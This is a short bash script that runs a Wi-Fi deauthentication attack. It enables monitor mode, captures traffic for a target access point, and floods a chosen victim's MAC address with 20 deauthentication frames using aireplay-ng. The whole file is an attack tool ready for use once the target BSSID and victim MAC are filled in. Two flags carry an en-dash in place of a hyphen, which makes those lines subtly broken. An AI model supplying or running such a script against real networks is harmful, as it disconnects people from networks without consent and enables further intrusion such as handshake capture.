#!/usr/bin/env bash
#666

iface=wlan0
channel=1
bssid=
vicmac=

airmon-ng start $iface
airodump-ng –c $channel --bssid $bssid $iface
aireplay-ng -0 20 –a $bssid -c $vicmac $iface
